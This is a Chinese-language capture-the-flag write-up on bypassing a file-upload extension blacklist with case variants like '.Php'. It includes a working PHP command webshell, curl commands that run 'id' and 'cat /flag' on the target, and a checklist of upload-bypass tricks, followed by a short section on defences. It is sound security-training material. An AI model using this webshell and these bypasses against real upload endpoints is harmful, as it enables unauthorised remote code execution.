# exam-web03 — 文件上传黑名单绕过

**题目**：访问 10003 端口，Flag 在靶机 `/flag` 文件中
**环境**：Apache 2.4.54 + PHP 7.4.33，Debian
**外网**：183.129.189.62:21310

---

## 开局：先摸一遍站点

打开浏览器访问 `http://183.129.189.62:21310/`，一个"文件分享平台"页面，中间一个大大的上传区域，写着"拖放文件到此处，或点击上传"。前端提示："仅支持非脚本文件"、"禁止上传脚本文件"。

行，文件上传题，老套路了。

先看看 HTTP 响应头确认下环境：
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

Apache + PHP 7.4，Debian 系统。标准的 LAMP。

F12 看一眼页面源码，上传表单指向 `upload.php`，请求方式是 POST，参数名叫 `file`。整个流程是前端 ajax 上传，后端返回 JSON。

顺手测一下有没有 `uploads/` 目录——200 OK，还开了目录浏览。上传之后的文件路径一目了然。

---

## 第一轮试探：直传 PHP

先造一个最简单的 PHP 文件试试水：

```php
<?php phpinfo();?>
```

用 curl 扔上去：

```bash
curl -F "file=@test.php" http://183.129.189.62:21310/upload.php
```

返回：
```json
{"status":false,"msg":"禁止上传PHP文件！"}
```

不出所料，直接 `.php` 被拦了。说明服务端做了后缀校验。但它是怎么过滤的？白名单还是黑名单？如果是白名单，大概率只允许图片/文档后缀，那基本没戏。如果是黑名单，就有办法绕。

---

## 第二轮试探：摸清黑名单范围

遇到黑名单，我的习惯是先搞清楚它到底堵了哪些口。

首先试正常的 txt 文件，确认上传通道本身是通的：
```bash
echo "test" > test.txt
curl -F "file=@test.txt" http://183.129.189.62:21310/upload.php
# {"status":true,"msg":"文件上传成功！访问路径：...uploads/test.txt"}
```
通道畅通，没问题。说明不是白名单，是黑名单过滤。

接下来系统性地测后缀。我的经验是，Apache 能解析的 PHP 相关后缀有：
`.php` `.php3` `.php4` `.php5` `.php7` `.phtml` `.pht` `.phar` `.Php` `.PHP` `.pHp` ...

一拨全试过去：

| 我试的后缀 | 服务器回复 | 我的判断 |
|:--|:--|:--|
| `.php` | ❌ 禁止上传PHP文件 | 核心拦截 |
| `.php3` | ❌ 禁止上传PHP文件 | 也在黑名单 |
| `.php4` | ❌ 禁止上传PHP文件 | 也在黑名单 |
| `.php5` | ❌ 禁止上传PHP文件 | 也在黑名单 |
| `.php7` | ❌ 禁止上传PHP文件 | 也在黑名单 |
| `.phtml` | ✅ 上传成功 | **没拦！** |
| `.phar`  | ✅ 上传成功 | **没拦！** |
| `.pht`   | ✅ 上传成功 | **没拦！** |
| `.Php`   | ✅ 上传成功 | **没拦！** |
| `.PHP`   | ✅ 上传成功 | **没拦！** |

出结果的瞬间我就兴奋了——`.Php` 和 `.PHP` 都通过了！

**直觉告诉我，这个黑名单可能只是简单匹配了 `php` 这几个字母，连大小写都没处理。** 典型的"用 `strpos` 或者不区分大小写的正则，但实际上写成了区分大小写"的 bug。

---

## 第三轮：验证哪些后缀能被 Apache 当成 PHP 执行

绕过上传只是第一步，关键是要让 Apache 把我上传的文件当 PHP 来执行。不然就算传上去了，浏览器也只是把源码原样显示出来。

我挨个访问上传成功的文件：
- `uploads/hzr.phtml` → 浏览器直接显示 `<?php phpinfo();?>`，没有执行 ❌
- `uploads/hzr.phar`  → 同样直接显示源码 ❌  
- `uploads/hzr.pht`   → 同样 ❌
- `uploads/hzr.Php`   → **出现了 phpinfo 页面！** ✅
- `uploads/hzr.PHP`   → **也出现了 phpinfo 页面！** ✅

`phtml`、`phar`、`pht` 虽然在黑名单之外，但这台机器上的 Apache 配置没有把它们关联到 PHP 处理器。而 `.Php` 和 `.PHP` — 大小写变体 — Apache 默认就会交给 PHP 处理。

**So，漏洞链闭合了：上传时黑名单只拦小写 → `.Php` 绕过 → Apache 照样解析。**

---

## 第四轮：拿 Flag

确认能执行 PHP 了，直接换成一个命令执行的 webshell：

```php
<?php system($_GET["c"]);?>
```

保存为 `hzr.Php`，上传。然后访问：

```bash
# 验证身份
curl "http://183.129.189.62:21310/uploads/hzr.Php?c=id"
# uid=33(www-data) gid=33(www-data)

# 找 flag
curl "http://183.129.189.62:21310/uploads/hzr.Php?c=ls%20-la%20/"
# -rw-r--r-- 1 root root 38 ... /flag

# 拿到了
curl "http://183.129.189.62:21310/uploads/hzr.Php?c=cat%20/flag"
# flag{40ffc00a978caf90dc67c9beed328fe3}
```

Flag 就在根目录下，38 个字节，`www-data` 可读。一波带走。

---

## 回顾：解题脑内流程

```
打开页面 → "文件上传平台，试试上传php"
  → 被拒 → "果然是过滤了"
    → 上传txt确认通道正常 → "黑名单，不是白名单，有戏"
      → 批量测各种php后缀 → "phtml/phar/pht/Php/PHP 都过了！"
        → 逐个访问看是否解析 → "只有 .Php 和 .PHP 被Apache执行！"
          → 换webshell上传 → 拿到shell → cat /flag → 搞定
```

**核心发现**：黑名单过滤漏掉了大小写变体 `.Php` / `.PHP`，而 Apache 又恰好把它们当作 PHP 脚本来解析。

**一句话总结**：开发写过滤规则时只挡了小写 `php`，忘了大写组合。

---

## 这道题教会我的

1. **黑名单绕过的第一步永远是搞清楚到底拦了什么、漏了什么。** 不要只试一两个后缀就放弃。
2. **上传成功 ≠ 能执行。** `phtml` 和 `phar` 都能传上去，但 Apache 不解析，只是废文件。要多走一步验证。
3. **大小写是一个被低估的攻击面。** 很多人写正则的时候习惯性加 `/i`，但总有人忘记。这道题就是典型的例子。
4. **phpinfo 比 webshell 更适合做"能不能执行"的探测。** 体积小、无危害、反馈明确，用来判断解析与否非常高效。

---

## 同类题 checklist（下次遇到上传题挨个试）

- [ ] 大小写：`.Php` `.PHP` `.pHp` `.pHp`
- [ ] 双扩展：`.jpg.php` `.php.jpg`（看 Apache 怎么处理）
- [ ] Apache 备用后缀：`.phtml` `.pht` `.phar` `.php5` `.php7`
- [ ] `.htaccess` 上传：`AddType application/x-httpd-php .jpg`
- [ ] Content-Type 改成 `image/jpeg`
- [ ] 文件头加 `GIF89a` 伪装图片
- [ ] 空字节截断（老版本 PHP）：`shell.php%00.jpg`
- [ ] IIS 特性：`shell.asp;.jpg`

---

## 防御视角

如果我是这个站点的开发，我会怎么修：

1. **白名单**，别用黑名单。只允许 `jpg|png|gif|pdf|doc` 这几个后缀，其余全拒。
2. **上传后重命名**，用 `uuid + 原扩展名`，不让用户控制文件名。
3. **uploads 目录用 `.htaccess` 禁掉 PHP 引擎**：`php_flag engine off`。
4. **检查文件内容**，不只看后缀，读一下文件头魔术字节。
